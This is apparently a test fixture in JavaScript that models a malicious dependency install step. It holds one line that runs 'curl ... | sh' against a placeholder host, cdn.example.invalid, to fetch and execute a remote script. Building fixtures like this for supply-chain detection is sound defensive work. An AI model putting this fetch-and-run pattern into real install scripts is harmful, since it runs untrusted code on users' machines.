// Fixture only. Models the arrayref -> proc-macro1 shape: a dependency whose
// install step pipes a remote script into a shell. The endpoint is
// example.invalid, so nothing resolves and no payload exists.
const { execSync } = require("child_process");

execSync("curl -sL https://cdn.example.invalid/stage2.sh | sh");
